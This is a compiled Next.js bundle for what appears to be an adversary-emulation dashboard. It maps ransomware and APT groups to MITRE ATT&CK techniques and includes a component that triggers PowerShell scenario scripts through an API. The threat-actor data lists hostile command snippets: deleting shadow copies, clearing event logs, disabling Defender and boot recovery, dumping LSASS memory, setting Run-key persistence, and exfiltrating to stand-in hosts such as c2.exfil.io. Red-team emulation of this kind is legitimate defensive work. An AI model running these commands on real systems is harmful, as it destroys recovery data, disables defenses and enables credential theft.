module.exports = [
"[project]/src/lib/types.ts [app-ssr] (ecmascript)", ((__turbopack_context__) => {
"use strict";

__turbopack_context__.s([
    "CAMPAIGNS",
    ()=>CAMPAIGNS,
    "SCENARIOS",
    ()=>SCENARIOS,
    "THREAT_ACTORS",
    ()=>THREAT_ACTORS
]);
const SCENARIOS = [
    {
        id: 'recon-local',
        name: 'Host Reconnaissance (PowerShell)',
        adversary: 'Red Team Ops',
        description: 'Enumerates local network connections and running processes to identify key assets.',
        mitreTechniques: [
            {
                id: 'T1049',
                name: 'System Network Connections Discovery',
                url: 'https://attack.mitre.org/techniques/T1049/'
            },
            {
                id: 'T1057',
                name: 'Process Discovery',
                url: 'https://attack.mitre.org/techniques/T1057/'
            }
        ],
        scriptPath: 'scenarios/recon_local.ps1',
        estimatedDuration: '2 mins',
        difficulty: 'Easy'
    },
    {
        id: 'priv-esc',
        name: 'Privilege Escalation Check',
        adversary: 'APT28',
        description: 'Checks current privileges and simulates enabling SeDebugPrivilege.',
        mitreTechniques: [
            {
                id: 'T1134',
                name: 'Access Token Manipulation',
                url: 'https://attack.mitre.org/techniques/T1134/'
            }
        ],
        scriptPath: 'scenarios/priv_esc.ps1',
        estimatedDuration: '1 min',
        difficulty: 'Medium'
    },
    {
        id: 'lateral-dc',
        name: 'Lateral Movement to Domain Controller',
        adversary: 'APT28',
        description: 'Attempts to verify connectivity and simulate administrative share access to the DC (10.160.37.16).',
        mitreTechniques: [
            {
                id: 'T1021.002',
                name: 'Remote Services: SMB',
                url: 'https://attack.mitre.org/techniques/T1021/002/'
            }
        ],
        scriptPath: 'scenarios/lateral_dc.ps1',
        estimatedDuration: '5 mins',
        difficulty: 'Hard'
    },
    {
        id: 'c2-check',
        name: 'C2 Connectivity Check',
        adversary: 'Scattered Spider',
        description: 'Verifies DNS resolution and TCP connectivity to the configured C2 infrastructure.',
        mitreTechniques: [
            {
                id: 'T1071',
                name: 'Application Layer Protocol',
                url: 'https://attack.mitre.org/techniques/T1071/'
            }
        ],
        scriptPath: 'scenarios/c2_check.ps1',
        estimatedDuration: '2 mins',
        difficulty: 'Easy'
    },
    {
        id: 'persistence-reg',
        name: 'Persistence (Registry)',
        adversary: 'APT1',
        description: 'Creates a simulated malicious Run key in HKCU.',
        mitreTechniques: [
            {
                id: 'T1547.001',
                name: 'Registry Run Keys',
                url: 'https://attack.mitre.org/techniques/T1547/001/'
            }
        ],
        scriptPath: 'scenarios/persistence.ps1',
        estimatedDuration: '1 min',
        difficulty: 'Medium'
    },
    {
        id: 'defense-evasion',
        name: 'Defense Evasion (Clear Logs)',
        adversary: 'Red Team Ops',
        description: 'Simulates clearing the Security Event Log.',
        mitreTechniques: [
            {
                id: 'T1070.001',
                name: 'Indicator Removal: Clear Windows Event Logs',
                url: 'https://attack.mitre.org/techniques/T1070/001/'
            }
        ],
        scriptPath: 'scenarios/defense_evasion.ps1',
        estimatedDuration: '2 mins',
        difficulty: 'Medium'
    },
    {
        id: 'cred-dump',
        name: 'Credential Dumping (Active)',
        adversary: 'APT1',
        description: 'Simulates dumping LSASS memory using rundll32 and comsvcs.dll.',
        mitreTechniques: [
            {
                id: 'T1003.001',
                name: 'OS Credential Dumping: LSASS Memory',
                url: 'https://attack.mitre.org/techniques/T1003/001/'
            }
        ],
        scriptPath: 'scenarios/cred_dump.ps1',
        estimatedDuration: '3 mins',
        difficulty: 'Hard'
    },
    {
        id: 'initial-access',
        name: 'Initial Access (Payload Staging)',
        adversary: 'APT45',
        description: 'Simulates dropping a payload (output.wav) to C:\\temp for exfiltration.',
        mitreTechniques: [
            {
                id: 'T1105',
                name: 'Ingress Tool Transfer',
                url: 'https://attack.mitre.org/techniques/T1105/'
            }
        ],
        scriptPath: 'scenarios/initial_access.ps1',
        estimatedDuration: '1 min',
        difficulty: 'Easy'
    },
    {
        id: 'exfil-dns',
        name: 'Exfiltration via DNS',
        adversary: 'APT45',
        description: 'Reads the staged payload and exfiltrates it via DNS A record queries.',
        mitreTechniques: [
            {
                id: 'T1048.003',
                name: 'Exfiltration Over Alternative Protocol: DNS',
                url: 'https://attack.mitre.org/techniques/T1048/003/'
            }
        ],
        scriptPath: 'scenarios/exfil_dns.ps1',
        estimatedDuration: '3 mins',
        difficulty: 'Hard'
    }
];
const CAMPAIGNS = [
    {
        id: 'full-killchain-campaign',
        adversary: 'Red Team Ops',
        name: 'Full Killchain Emulation',
        description: 'A complete end-to-end simulation from Initial Access to Exfiltration.',
        steps: [
            'initial-access',
            'persistence-reg',
            'priv-esc',
            'defense-evasion',
            'lateral-dc',
            'c2-check',
            'exfil-dns'
        ]
    },
    {
        id: 'apt28-campaign',
        adversary: 'APT28',
        name: 'Operation XAgent',
        description: 'Simulates a typical APT28 intrusion chain involving recon, privilege escalation, and lateral movement targeting high-value infrastructure.',
        steps: [
            'recon-local',
            'priv-esc',
            'lateral-dc',
            'cred-dump'
        ] // Example chain
    },
    {
        id: 'apt1-campaign',
        adversary: 'APT1',
        name: 'Operation Comment Crew',
        description: 'A noise-heavy campaign focusing on persistence and credential harvesting.',
        steps: [
            'recon-local',
            'persistence-reg',
            'cred-dump'
        ]
    },
    {
        id: 'scattered-spider-campaign',
        adversary: 'Scattered Spider',
        name: 'Cloud & Identity Siege',
        description: 'Focuses on connecting to C2, evading defenses, and establishing persistence for long-term access.',
        steps: [
            'c2-check',
            'defense-evasion',
            'persistence-reg',
            'priv-esc'
        ]
    },
    {
        id: 'apt45-campaign',
        adversary: 'APT45',
        name: 'North Korean Info Stealer',
        description: 'Rapid collection of information and credentials.',
        steps: [
            'recon-local',
            'defense-evasion',
            'cred-dump'
        ]
    },
    {
        id: 'mustang-panda-campaign',
        adversary: 'Mustang Panda',
        name: 'PlugX Propagation',
        description: 'Lateral movement and C2 beaconing focus.',
        steps: [
            'recon-local',
            'lateral-dc',
            'c2-check'
        ]
    },
    {
        id: 'wizard-spider-campaign',
        adversary: 'Wizard Spider',
        name: 'Conti/Ryuk Precursor',
        description: 'The prelude to a ransomware attack: Recon, C2 verification, and spreading via SMB.',
        steps: [
            'recon-local',
            'c2-check',
            'lateral-dc',
            'defense-evasion'
        ]
    }
];
const THREAT_ACTORS = [
    {
        id: 'lockbit',
        name: 'LockBit 3.0',
        aliases: [
            'LockBit Black'
        ],
        description: 'One of the most prolific RaaS groups. LockBit 3.0 uses a modular ransomware payload and extensive living-off-the-land techniques.',
        ttps: [
            {
                id: 'T1047',
                technique: 'Windows Management Instrumentation',
                tactic: 'Execution',
                description: 'Uses WMI to delete Volume Shadow Copies to prevent recovery.',
                commandSnippet: 'Get-WmiObject Win32_Shadowcopy | ForEach-Object { $_.Delete() }',
                scriptPath: 'scenarios/lockbit/wmi_shadowcopy.ps1'
            },
            {
                id: 'T1070.001',
                technique: 'Indicator Removal: Clear Windows Event Logs',
                tactic: 'Defense Evasion',
                description: 'Clears security, system, and application logs to hide activity.',
                commandSnippet: 'wevtutil cl Security; wevtutil cl System; wevtutil cl Application',
                scriptPath: 'scenarios/lockbit/log_clear.ps1'
            },
            {
                id: 'T1112',
                technique: 'Modify Registry',
                tactic: 'Defense Evasion',
                description: 'Modifies registry to disable Windows Defender defenses.',
                commandSnippet: 'Set-MpPreference -DisableRealtimeMonitoring $true',
                scriptPath: 'scenarios/lockbit/disable_defender.ps1'
            },
            {
                id: 'T1490',
                technique: 'Inhibit System Recovery',
                tactic: 'Impact',
                description: 'Disables boot recovery options using bcdedit.',
                commandSnippet: 'bcdedit /set {default} recoveryenabled No',
                scriptPath: 'scenarios/lockbit/bcdedit_recovery.ps1'
            }
        ]
    },
    {
        id: 'generic-discovery',
        name: 'Generic Discovery Modules',
        aliases: [
            'Red Team Ops',
            'Manual Recon'
        ],
        description: 'Common discovery commands used by various threat actors to enumerate the environment.',
        ttps: [
            {
                id: 'T1016',
                technique: 'System Network Configuration Discovery',
                tactic: 'Discovery',
                description: 'Enumerates network interfaces and IP configurations.',
                commandSnippet: 'ipconfig /all',
                scriptPath: 'scenarios/library/discovery_network.ps1'
            },
            {
                id: 'T1069',
                technique: 'Permission Groups Discovery',
                tactic: 'Discovery',
                description: 'Enumerates domain groups and members.',
                commandSnippet: 'net group /domain "Domain Admins"',
                scriptPath: 'scenarios/library/discovery_groups.ps1'
            },
            {
                id: 'T1033',
                technique: 'System Owner/User Discovery',
                tactic: 'Discovery',
                description: 'Identifies the current user context.',
                commandSnippet: 'whoami /all',
                scriptPath: 'scenarios/library/discovery_user.ps1'
            },
            {
                id: 'T1087',
                technique: 'Account Discovery',
                tactic: 'Discovery',
                description: 'Enumerates all users in the domain.',
                commandSnippet: 'Get-ADUser -Filter * | Select-Object Name,SamAccountName',
                scriptPath: 'scenarios/library/discovery_ad_users.ps1'
            }
        ]
    },
    {
        id: 'blackbasta',
        name: 'Black Basta',
        aliases: [
            'Black Basta Syndicate'
        ],
        description: 'Emerged in 2022 as a potent RaaS. Known for spearphishing, Qakbot distribution, and using Backstab to disable EDR.',
        ttps: [
            {
                id: 'T1566',
                technique: 'Phishing',
                tactic: 'Initial Access',
                description: 'Uses spearphishing emails with malicious ZIP attachments.',
                commandSnippet: '# Simulated phishing delivery',
                scriptPath: 'scenarios/blackbasta/phishing_sim.ps1'
            },
            {
                id: 'T1562.001',
                technique: 'Impair Defenses: Disable or Modify Tools',
                tactic: 'Defense Evasion',
                description: 'Uses Backstab tool to disable EDR products.',
                commandSnippet: 'Stop-Service -Name "Sense" -Force',
                scriptPath: 'scenarios/blackbasta/disable_edr.ps1'
            },
            {
                id: 'T1068',
                technique: 'Exploitation for Privilege Escalation',
                tactic: 'Privilege Escalation',
                description: 'Uses exploits like Zerologon, NoPac, PrintNightmare.',
                commandSnippet: '# Invoke-ZeroLogon simulation',
                scriptPath: 'scenarios/blackbasta/priv_esc_exploit.ps1'
            },
            {
                id: 'T1021.001',
                technique: 'Remote Services: RDP',
                tactic: 'Lateral Movement',
                description: 'Uses valid accounts for RDP access.',
                commandSnippet: 'mstsc /v:<TARGET_IP>',
                scriptPath: 'scenarios/blackbasta/rdp_lateral.ps1'
            }
        ]
    },
    {
        id: 'alphv',
        name: 'ALPHV / BlackCat',
        aliases: [
            'ALPHV',
            'BlackCat',
            'Noberus'
        ],
        description: 'First major ransomware written in Rust. Highly customizable with multiple extortion methods.',
        ttps: [
            {
                id: 'T1078',
                technique: 'Valid Accounts',
                tactic: 'Initial Access',
                description: 'Uses ProxyShell vulnerabilities for initial access.',
                commandSnippet: '# ProxyShell exploitation simulation',
                scriptPath: 'scenarios/alphv/proxyshell_sim.ps1'
            },
            {
                id: 'T1059.001',
                technique: 'PowerShell',
                tactic: 'Execution',
                description: 'Uses PowerShell to delete shadow copies and clear logs.',
                commandSnippet: 'Get-WmiObject Win32_Shadowcopy | Remove-WmiObject',
                scriptPath: 'scenarios/alphv/ps_execution.ps1'
            },
            {
                id: 'T1053',
                technique: 'Scheduled Task/Job',
                tactic: 'Execution',
                description: 'Creates scheduled tasks to deploy ransomware via GPO.',
                commandSnippet: 'schtasks /create /sc once /tn "Update" /tr "C:\\payload.exe" /st 00:00',
                scriptPath: 'scenarios/alphv/schtask_create.ps1'
            }
        ]
    },
    {
        id: 'avoslocker',
        name: 'AvosLocker',
        aliases: [
            'Avos',
            'AvosLocker RaaS'
        ],
        description: 'RaaS known for exploiting public-facing applications and using legitimate remote access tools.',
        ttps: [
            {
                id: 'T1190',
                technique: 'Exploit Public-Facing Application',
                tactic: 'Initial Access',
                description: 'Exploits vulnerable web applications for entry.',
                commandSnippet: '# Web exploit simulation',
                scriptPath: 'scenarios/avoslocker/webexploit_sim.ps1'
            },
            {
                id: 'T1490',
                technique: 'Inhibit System Recovery',
                tactic: 'Impact',
                description: 'Deletes shadow copies to prevent recovery.',
                commandSnippet: 'vssadmin delete shadows /all /quiet',
                scriptPath: 'scenarios/avoslocker/delete_shadows.ps1'
            },
            {
                id: 'T1219',
                technique: 'Remote Access Tools',
                tactic: 'Command and Control',
                description: 'Uses tools like AnyDesk or TeamViewer for persistence.',
                commandSnippet: 'Start-Process "C:\\AnyDesk\\AnyDesk.exe" -ArgumentList "--start-service"',
                scriptPath: 'scenarios/avoslocker/rat_install.ps1'
            },
            {
                id: 'T1486',
                technique: 'Data Encrypted for Impact',
                tactic: 'Impact',
                description: 'Encrypts victim data to demand ransom.',
                commandSnippet: '# Encryption simulation (safe mode)',
                scriptPath: 'scenarios/avoslocker/encrypt_sim.ps1'
            }
        ]
    },
    {
        id: 'bianlian',
        name: 'BianLian',
        aliases: [
            'BianLian Gang'
        ],
        description: 'Go-based ransomware known for sandbox evasion and spreading via removable media.',
        ttps: [
            {
                id: 'T1497',
                technique: 'Virtualization/Sandbox Evasion',
                tactic: 'Defense Evasion',
                description: 'Detects and avoids virtualization environments.',
                commandSnippet: 'Get-WmiObject Win32_ComputerSystem | Select-Object Manufacturer',
                scriptPath: 'scenarios/bianlian/vm_detect.ps1'
            },
            {
                id: 'T1027.002',
                technique: 'Software Packing',
                tactic: 'Defense Evasion',
                description: 'Uses software packing to conceal code.',
                commandSnippet: '# Packed payload simulation',
                scriptPath: 'scenarios/bianlian/packed_payload.ps1'
            },
            {
                id: 'T1091',
                technique: 'Replication Through Removable Media',
                tactic: 'Lateral Movement',
                description: 'Spreads via USB and autorun.',
                commandSnippet: 'Get-WmiObject Win32_LogicalDisk -Filter "DriveType=2"',
                scriptPath: 'scenarios/bianlian/usb_spread.ps1'
            },
            {
                id: 'T1486',
                technique: 'Data Encrypted for Impact',
                tactic: 'Impact',
                description: 'Encrypts data for extortion.',
                commandSnippet: '# Encryption simulation (safe mode)',
                scriptPath: 'scenarios/bianlian/encrypt_sim.ps1'
            }
        ]
    },
    {
        id: 'clop',
        name: 'Cl0p',
        aliases: [
            'Cl0p',
            'TA505',
            'FIN11'
        ],
        description: 'Notorious for exploiting zero-days (MOVEit, Accellion FTA) and large-scale data theft.',
        ttps: [
            {
                id: 'T1190',
                technique: 'Exploit Public-Facing Application',
                tactic: 'Initial Access',
                description: 'Exploits CVEs like MOVEit (CVE-2023-34362).',
                commandSnippet: '# MOVEit exploit simulation',
                scriptPath: 'scenarios/clop/moveit_exploit.ps1'
            },
            {
                id: 'T1547',
                technique: 'Boot or Logon Autostart Execution',
                tactic: 'Persistence',
                description: 'Creates registry run entries for persistence.',
                commandSnippet: 'Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "Update" -Value "C:\\payload.exe"',
                scriptPath: 'scenarios/clop/registry_persist.ps1'
            },
            {
                id: 'T1070.001',
                technique: 'Clear Windows Event Logs',
                tactic: 'Defense Evasion',
                description: 'Clears event logs to hide activity.',
                commandSnippet: 'wevtutil cl Security; wevtutil cl System',
                scriptPath: 'scenarios/clop/log_clear.ps1'
            },
            {
                id: 'T1567',
                technique: 'Exfiltration Over Web Service',
                tactic: 'Exfiltration',
                description: 'Exfiltrates data via DEWMODE webshell.',
                commandSnippet: '# Webshell exfil simulation',
                scriptPath: 'scenarios/clop/webshell_exfil.ps1'
            }
        ]
    },
    {
        id: 'conti',
        name: 'Conti',
        aliases: [
            'Conti Team',
            'Wizard Spider'
        ],
        description: 'Major RaaS operation until 2022. Known for fast encryption and double extortion.',
        ttps: [
            {
                id: 'T1486',
                technique: 'Data Encrypted for Impact',
                tactic: 'Impact',
                description: 'Fast, multi-threaded file encryption.',
                commandSnippet: '# Fast encryption simulation',
                scriptPath: 'scenarios/conti/encrypt_sim.ps1'
            },
            {
                id: 'T1567',
                technique: 'Exfiltration Over Web Service',
                tactic: 'Exfiltration',
                description: 'Exfiltrates data before encryption for double extortion.',
                commandSnippet: 'Invoke-WebRequest -Uri "https://c2.exfil.io/upload" -Method POST',
                scriptPath: 'scenarios/conti/exfil_web.ps1'
            }
        ]
    },
    {
        id: 'dragonforce',
        name: 'DragonForce',
        aliases: [
            'DragonForce Malaysia'
        ],
        description: 'Hacktivist-turned-ransomware group known for self-deleting payloads.',
        ttps: [
            {
                id: 'T1562.001',
                technique: 'Impair Defenses: Disable or Modify Tools',
                tactic: 'Defense Evasion',
                description: 'Disables Windows Defender before encryption.',
                commandSnippet: 'Set-MpPreference -DisableRealtimeMonitoring $true',
                scriptPath: 'scenarios/dragonforce/disable_defender.ps1'
            },
            {
                id: 'T1070.004',
                technique: 'Indicator Removal: File Deletion',
                tactic: 'Defense Evasion',
                description: 'Self-deletes ransomware binary after execution.',
                commandSnippet: 'Remove-Item -Path $MyInvocation.MyCommand.Path -Force',
                scriptPath: 'scenarios/dragonforce/self_delete.ps1'
            },
            {
                id: 'T1486',
                technique: 'Data Encrypted for Impact',
                tactic: 'Impact',
                description: 'Encrypts files for ransom.',
                commandSnippet: '# Encryption simulation',
                scriptPath: 'scenarios/dragonforce/encrypt_sim.ps1'
            }
        ]
    },
    {
        id: 'safepay',
        name: 'SafePay',
        aliases: [
            'SafePay Ransomware'
        ],
        description: 'RaaS gaining access via RDP and using UAC bypass via CMSTPLUA COM object.',
        ttps: [
            {
                id: 'T1133',
                technique: 'External Remote Services',
                tactic: 'Initial Access',
                description: 'Gains access via exposed RDP services.',
                commandSnippet: 'Test-NetConnection -ComputerName <TARGET> -Port 3389',
                scriptPath: 'scenarios/safepay/rdp_scan.ps1'
            },
            {
                id: 'T1548.002',
                technique: 'Abuse Elevation Control Mechanism: Bypass UAC',
                tactic: 'Privilege Escalation',
                description: 'Bypasses UAC using CMSTPLUA COM object.',
                commandSnippet: '# UAC bypass via CMSTPLUA simulation',
                scriptPath: 'scenarios/safepay/uac_bypass.ps1'
            },
            {
                id: 'T1003',
                technique: 'Credential Dumping',
                tactic: 'Credential Access',
                description: 'Harvests credentials for lateral movement.',
                commandSnippet: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump (Get-Process lsass).Id C:\\temp\\lsass.dmp full',
                scriptPath: 'scenarios/safepay/cred_dump.ps1'
            },
            {
                id: 'T1048',
                technique: 'Exfiltration Over Alternative Protocol',
                tactic: 'Exfiltration',
                description: 'Uses FTP (FileZilla) for data exfiltration.',
                commandSnippet: 'ftp -s:script.txt ftp.exfil.io',
                scriptPath: 'scenarios/safepay/ftp_exfil.ps1'
            }
        ]
    }
];
}),
"[project]/src/app/page.module.css [app-ssr] (css module)", ((__turbopack_context__) => {

__turbopack_context__.v({
  "badge": "page-module___8aEwW__badge",
  "header": "page-module___8aEwW__header",
  "scenariosGrid": "page-module___8aEwW__scenariosGrid",
  "status": "page-module___8aEwW__status",
  "tag": "page-module___8aEwW__tag",
});
}),
"[project]/src/components/ThreatLibrary.tsx [app-ssr] (ecmascript)", ((__turbopack_context__) => {
"use strict";

__turbopack_context__.s([
    "default",
    ()=>ThreatLibrary
]);
var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/node_modules/next/dist/server/route-modules/app-page/vendored/ssr/react-jsx-dev-runtime.js [app-ssr] (ecmascript)");
var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/node_modules/next/dist/server/route-modules/app-page/vendored/ssr/react.js [app-ssr] (ecmascript)");
var __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$types$2e$ts__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/src/lib/types.ts [app-ssr] (ecmascript)");
'use client';
;
;
;
function ThreatLibrary() {
    const [selectedActorId, setSelectedActorId] = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["useState"])(null);
    const [runningTTP, setRunningTTP] = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["useState"])(null);
    const [output, setOutput] = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["useState"])({});
    const selectedActor = __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$types$2e$ts__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["THREAT_ACTORS"].find((a)=>a.id === selectedActorId);
    const executeTTP = async (ttp)=>{
        if (!ttp.scriptPath) return;
        setRunningTTP(ttp.id);
        try {
            const res = await fetch('/api/execute', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    scriptPath: ttp.scriptPath,
                    params: []
                })
            });
            const data = await res.json();
            setOutput((prev)=>({
                    ...prev,
                    [ttp.id]: data.output || data.error
                }));
        } catch (e) {
            setOutput((prev)=>({
                    ...prev,
                    [ttp.id]: 'Failed to execute TTP.'
                }));
        } finally{
            setRunningTTP(null);
        }
    };
    if (selectedActor) {
        return /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
            style: {
                animation: 'fadeIn 0.3s ease'
            },
            children: [
                /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("button", {
                    onClick: ()=>setSelectedActorId(null),
                    className: "btn",
                    style: {
                        marginBottom: '1rem',
                        padding: '0.5rem 1rem'
                    },
                    children: "← BACK TO LIBRARY"
                }, void 0, false, {
                    fileName: "[project]/src/components/ThreatLibrary.tsx",
                    lineNumber: 39,
                    columnNumber: 17
                }, this),
                /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                    className: "card",
                    style: {
                        border: '1px solid var(--primary)',
                        boxShadow: '0 0 15px rgba(0, 255, 65, 0.1)'
                    },
                    children: [
                        /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("h1", {
                            className: "mono text-primary",
                            style: {
                                fontSize: '2rem',
                                marginBottom: '0.5rem'
                            },
                            children: selectedActor.name
                        }, void 0, false, {
                            fileName: "[project]/src/components/ThreatLibrary.tsx",
                            lineNumber: 48,
                            columnNumber: 21
                        }, this),
                        selectedActor.aliases.length > 0 && /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
                            className: "mono text-dim",
                            style: {
                                marginBottom: '1rem'
                            },
                            children: [
                                "ALIASES: ",
                                selectedActor.aliases.join(', ')
                            ]
                        }, void 0, true, {
                            fileName: "[project]/src/components/ThreatLibrary.tsx",
                            lineNumber: 52,
                            columnNumber: 25
                        }, this),
                        /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
                            style: {
                                lineHeight: '1.6',
                                marginBottom: '2rem',
                                fontSize: '1.1rem'
                            },
                            children: selectedActor.description
                        }, void 0, false, {
                            fileName: "[project]/src/components/ThreatLibrary.tsx",
                            lineNumber: 56,
                            columnNumber: 21
                        }, this),
                        /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("h3", {
                            className: "mono",
                            style: {
                                borderBottom: '1px solid #333',
                                paddingBottom: '0.5rem',
                                marginBottom: '1rem'
                            },
                            children: "ATTRIBUTED TTPs"
                        }, void 0, false, {
                            fileName: "[project]/src/components/ThreatLibrary.tsx",
                            lineNumber: 60,
                            columnNumber: 21
                        }, this),
                        /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                            style: {
                                display: 'grid',
                                gap: '1rem'
                            },
                            children: selectedActor.ttps.map((ttp)=>/*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                    style: {
                                        background: 'rgba(255,255,255,0.03)',
                                        padding: '1rem',
                                        borderLeft: '2px solid var(--primary)'
                                    },
                                    children: [
                                        /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                            style: {
                                                display: 'flex',
                                                justifyContent: 'space-between',
                                                alignItems: 'center',
                                                marginBottom: '0.5rem'
                                            },
                                            children: [
                                                /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
                                                    className: "mono text-primary",
                                                    style: {
                                                        fontWeight: 'bold'
                                                    },
                                                    children: ttp.id
                                                }, void 0, false, {
                                                    fileName: "[project]/src/components/ThreatLibrary.tsx",
                                                    lineNumber: 72,
                                                    columnNumber: 37
                                                }, this),
                                                /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
                                                    className: "mono text-dim",
                                                    style: {
                                                        fontSize: '0.8rem'
                                                    },
                                                    children: ttp.tactic.toUpperCase()
                                                }, void 0, false, {
                                                    fileName: "[project]/src/components/ThreatLibrary.tsx",
                                                    lineNumber: 73,
                                                    columnNumber: 37
                                                }, this)
                                            ]
                                        }, void 0, true, {
                                            fileName: "[project]/src/components/ThreatLibrary.tsx",
                                            lineNumber: 71,
                                            columnNumber: 33
                                        }, this),
                                        /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("h4", {
                                            style: {
                                                marginBottom: '0.5rem'
                                            },
                                            children: ttp.technique
                                        }, void 0, false, {
                                            fileName: "[project]/src/components/ThreatLibrary.tsx",
                                            lineNumber: 75,
                                            columnNumber: 33
                                        }, this),
                                        /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
                                            className: "text-dim",
                                            style: {
                                                fontSize: '0.9rem',
                                                marginBottom: '1rem'
                                            },
                                            children: ttp.description
                                        }, void 0, false, {
                                            fileName: "[project]/src/components/ThreatLibrary.tsx",
                                            lineNumber: 76,
                                            columnNumber: 33
                                        }, this),
